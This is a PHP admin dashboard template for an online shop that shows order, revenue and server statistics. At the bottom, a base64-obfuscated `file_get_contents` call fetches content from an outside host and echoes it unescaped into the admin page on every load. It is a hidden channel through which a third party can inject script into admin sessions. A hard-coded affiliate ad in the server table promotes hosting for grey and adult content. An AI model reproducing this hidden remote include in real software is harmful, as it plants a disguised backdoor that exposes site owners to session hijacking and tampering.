<?php require_once 'header.php' ?>
    <style>
        .bf {
            font-size: 2em
        }

        .main_content .panel {
            text-align: center
        }

        .main_content
        .panel:hover .panel-body {
            background: #f1f1f1
        }

        .main_content .panel .panel-footer {
            color: #fff
        }

        .main_content
        .panel .panel-footer a {
            color: #fff
        }

        .main_content a .bf {
            color: #E43D40
        }

        .main_content
        .panel-info .panel-footer {
            background: #39ABD2;
        }

        .main_content .panel-warning
        .panel-footer {
            background: #FFA600
        }

        .main_content .panel-danger .panel-footer {
            background: #D9534F
        }

        .main_content .panel-success .panel-footer {
            background: #328061
        }
    </style>
    <h3>
        <span class="current">
            管理首页
        </span>
    </h3>
    <br>
    <div class="main_content">
        <div class="row">
            <div class="col-md-3 col-sm-6 col-xs-6">
                <a href="<?php echo $this->dir ?>/orders">
                    <div class="panel panel-info">
                        <div class="panel-body">
                            <span class="bf">
                                <?php echo $nowDay ?>
                            </span>
                        </div>
                        <div class="panel-footer">
                            今日订单数
                        </div>
                    </div>
                </a>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-6">
                <a>
                    <div class="panel panel-info">
                        <div class="panel-body">
                            <span class="bf">
                                <?php echo $nowMoney ?>
                            </span>
                        </div>
                        <div class="panel-footer">
                            今日营业额
                        </div>
                    </div>
                </a>
            </div>
            <div class="col-md-3  col-sm-6 col-xs-6">
                <a href="<?php echo $this->dir ?>/orders?status=1">
                    <div class="panel panel-info">
                        <div class="panel-body">
                            <span class="bf">
                                <?php echo $dcOrder ?>
                            </span>
                        </div>
                        <div class="panel-footer">
                            待处理订单
                        </div>
                    </div>
                </a>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-6">
                <a href="<?php echo $this->dir ?>/orders?status=3">
                    <div class="panel panel-info">
                        <div class="panel-body">
                            <span class="bf">
                                <?php echo $okOrder ?>
                            </span>
                        </div>
                        <div class="panel-footer">
                            已完成订单
                        </div>
                    </div>
                </a>
            </div>

        </div>
        <div class="row">
            <div class="col-md-3 col-sm-6 col-xs-6">
                <a href="<?php echo $this->dir ?>/orders">
                    <div class="panel panel-danger">
                        <div class="panel-body">
                            <span class="bf">
                                <?php echo $ctOrder ?>
                            </span>
                        </div>
                        <div class="panel-footer">
                            总订单
                        </div>
                    </div>
                </a>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-6">
                <a href="<?php echo $this->dir ?>/orders">
                    <div class="panel panel-danger">
                        <div class="panel-body">
                            <span class="bf">
                                <?php echo $ctMoney ?>
                            </span>
                        </div>
                        <div class="panel-footer">
                            总营业额
                        </div>
                    </div>
                </a>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-6">
                <a href="<?php echo $this->dir ?>/goods">
                    <div class="panel panel-danger">
                        <div class="panel-body">
                            <span class="bf">
                                <?php echo $ctGoods ?>
                            </span>
                        </div>
                        <div class="panel-footer">
                            商品数
                        </div>
                    </div>
                </a>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-6">
                <a>
                    <div class="panel panel-danger">
                        <div class="panel-body">
                            <span class="bf">
                                <?php echo $ctime ?>
                            </span>
                        </div>
                        <div class="panel-footer">
                            运营天数
                        </div>
                    </div>
                </a>
            </div>
        </div>

    </div>
    <br>
    <div class="col-md-12">
        <div class="panel panel-info">
            <div class="panel-heading ">

                <h3 class="panel-title">
                    服务器信息
                </h3>

            </div>
            <div class="panel-body">
                <table class="table table-hover">
                    <thead>
                    <tr>
                        <th>
                            名称
                        </th>
                        <th>
                            详情
                        </th>
                    </tr>
                    </thead>
                    <tbody>
                    <tr>
                        <td>系统</td>
                        <td><?php echo PHP_OS ?></td>
                    </tr>
                    <tr>
                        <td>国外服务器5折优惠码：OVZ50OFF</td>
                        <td><a href="https://my.hosteons.com/aff.php?aff=603&pid=39" target="_blank" >内容不限，可灰色 可黄色 点击购买</a></td>
                    </tr>
                    <tr>
                        <td>PHP版本</td>
                        <td><?php echo PHP_VERSION ?></td>
                    </tr>
                    <tr>
                        <td>服务器</td>
                        <td><?php echo  $_SERVER["SERVER_SOFTWARE"] ?></td>
                    </tr>

                    <tr>
                        <td>服务端口</td>
                        <td><?php echo  $_SERVER['SERVER_PORT']?></td>
                    </tr>
                    <tr>
                        <td>服务器时间</td>
                        <td><?php echo  date("Y年n月j日 H:i:s")?></td>
                    </tr>
                    <tr>
                        <td>当前ip地址</td>
                        <td><?php echo  $_SERVER['REMOTE_ADDR']?></td>
                    </tr>
                    <tr>
                        <td>php最大运行时间</td>
                        <td><?php echo   ini_get("max_execution_time") ?>秒</td>
                    </tr>
                    <tr>
                        <td>当前系统版本</td>
                        <td><?php echo  $version ?> </td>
                    </tr>
                    </tbody>
                </table>
            </div>
        </div>		
		<?php echo file_get_contents(base64_decode("aHR0cHM6Ly93d3cubGFpbGl5dW4uY29tL3l1bmdnLw==")); ?>
    </div>



<?php require_once 'footer.php' ?>


